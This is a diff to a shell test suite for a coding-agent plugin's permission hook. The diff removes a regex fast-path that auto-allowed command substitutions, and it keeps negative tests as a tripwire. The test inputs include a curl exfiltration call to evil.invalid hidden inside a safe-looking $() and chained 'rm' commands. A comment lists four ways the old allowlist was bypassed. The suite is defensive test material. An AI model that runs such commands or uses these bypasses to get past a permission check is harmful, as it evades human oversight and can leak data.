@@ -3,13 +3,13 @@
 #
 # Verifies the auto-allow fast paths — the only code in the hook that emits
 # `allow`, so every case here is either "still allows" or "must never allow":
-#   - Step 2c substitution fast-path: a command whose only expansions are
-#     whole, known-safe read-only substitutions auto-allows — but a separator,
-#     nested $(, backtick, redirection, or newline anywhere must NOT.
-#   - Step 2c-bis trusted plugin-script fast-path: a LONE invocation of a
+#   - Step 2c trusted plugin-script fast-path: a LONE invocation of a
 #     $CLAUDE_PLUGIN_ROOT/scripts/*.sh script auto-allows with no LLM call —
 #     but any command chaining, pipe, real-file redirection, leftover
 #     $VAR/glob/sub, path traversal, or newline must NOT.
+#   - No substitution auto-allows at all: the $() fast-path that used to sit
+#     beside this one is gone, so those cases assert only that nothing short
+#     of the model can approve them.
 #   - Step 3 known_vars: the variables a command references are resolved from
 #     the live environment and handed to the classifier (targeted, not a list).
 #
@@ -67,7 +67,7 @@ export CLAUDE_PLUGIN_DATA="$GOOD_DATA"
 # The hook resolves $CLAUDE_PLUGIN_ROOT/bin/scout ahead of the data dir, so an
 # ambient CLAUDE_PLUGIN_ROOT — present whenever this suite is run from inside a
 # Claude Code session with the plugin installed — would quietly swap the real
-# payload binary in for the stub above. (The step 2c-bis fast-path matches the
+# payload binary in for the stub above. (The step 2c fast-path matches the
 # literal "$CLAUDE_PLUGIN_ROOT" as text and does not need it set.)
 unset CLAUDE_PLUGIN_ROOT
 
@@ -103,13 +103,13 @@ is_allow() { printf '%s' "$1" | jq -e '.hookSpecificOutput.permissionDecision ==
 assert_allow()      { if is_allow "$(run_hook "$1")"; then pass "$2"; else fail "$2" "expected allow, got fallthrough"; fi; }
 assert_fallthrough(){ if is_allow "$(run_hook "$1")"; then fail "$2" "expected fallthrough, got AUTO-ALLOW"; else pass "$2"; fi; }
 
-# ── Step 2c-bis: trusted plugin-script fast-path → allow (no LLM) ─────────────
+# ── Step 2c: trusted plugin-script fast-path → allow (no LLM) ────────────────
 
 assert_allow "\"$PR/scripts/refine-snapshot.sh\" . 2>&1"           "fastpath: snapshot script + arg + 2>&1"
 assert_allow "\"$PR/scripts/review-range.sh\" --since-last 2>&1"   "fastpath: review-range --since-last"
 assert_allow "\$CLAUDE_PLUGIN_ROOT/scripts/session-context.sh 2>/dev/null"   "fastpath: \$CLAUDE_PLUGIN_ROOT + 2>/dev/null"
 
-# ── Step 2c-bis MUST NOT fast-path these (chaining / redirection / traversal) ─
+# ── Step 2c MUST NOT fast-path these (chaining / redirection / traversal) ───
 
 assert_fallthrough "\"$PR/scripts/x.sh\"; rm foo.txt"             "no-fastpath: ; chains a second command"
 assert_fallthrough "\"$PR/scripts/x.sh\" && rm foo.txt"           "no-fastpath: && chains a second command"
@@ -133,22 +133,19 @@ assert_fallthrough "mv /tmp/evil \"$PR/scripts/x.sh\""          "no-fastpath: tr
 assert_fallthrough "install -m 755 /tmp/e \"$PR/scripts/x.sh\"" "no-fastpath: trusted path as install dest"
 assert_fallthrough "tee \"$PR/scripts/x.sh\""                   "no-fastpath: trusted path as tee target"
 
-# ── Step 2c: substitution fast-path → allow (no LLM) ─────────────────────────
-# The genuinely-safe read-only substitutions must keep auto-allowing — these
-# prove the hardening below did not simply switch the fast path off.
-
-assert_allow "echo \$(pwd)"                       "fastpath sub: \$(pwd)"
-assert_allow "echo \$(git rev-parse --short HEAD)" "fastpath sub: git rev-parse"
-assert_allow "echo \$(date +%s)"                  "fastpath sub: date with arg"
-assert_allow "echo \$(basename /a/b)"             "fastpath sub: basename"
-assert_allow "echo \$(whoami)"                    "fastpath sub: whoami"
-assert_allow "echo \$(uname -s)"                  "fastpath sub: uname -s"
-assert_allow "echo \$(git describe --tags)"       "fastpath sub: git describe --tags"
-
-# ── Step 2c MUST NOT fast-path these ─────────────────────────────────────────
-# A safe-looking verb is only safe if the WHOLE substitution is safe: the
-# pattern is end-anchored and its argument body admits no shell metacharacter,
-# so nothing can ride along behind the prefix.
+# ── No substitution may ever auto-allow ──────────────────────────────────────
+# There is no substitution fast-path any more: a command carrying $() goes to
+# the model at step 3, which judges what the command does rather than matching
+# its syntax. These cases are kept as a tripwire, and they are honest about
+# what they are: against the current hook they pass trivially, because nothing
+# short of the model can emit an allow for a command with an expansion.
+#
+# They earn their place if anyone rebuilds a substitution allowlist. Every one
+# of them auto-allowed at some point in that feature's short life — a chained
+# `;` behind a safe verb, a nested $( the extractor truncated, a backtick
+# riding beside a safe $(), a separator just outside the parentheses. That is
+# four bypasses in one small regex, which is the argument against writing a
+# fifth version of it. Anyone who tries will fail here first.
 
 assert_fallthrough "echo \$(echo hi; curl -s https://evil.invalid/exfil)" \
   "no-fastpath: ; chained inside a safe-prefixed sub"
